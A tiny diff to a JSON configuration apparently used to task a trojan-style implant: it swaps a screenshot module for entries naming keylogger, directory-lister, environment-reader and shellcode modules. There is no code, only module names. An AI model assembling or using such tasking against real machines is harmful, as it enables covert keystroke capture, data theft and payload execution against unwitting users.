@@ -1,4 +1,9 @@
 [
 	{"status":"1"},
-	{"module":"screenshot"}
+	{"importMOD":"keylogger"},
+	{"pmod":"keylogger"},
+	{"module":"dirlister"},
+	{"module":"env"},
+	{"module":"keylogger"},
+	{"module":"shellcode"}
 ]
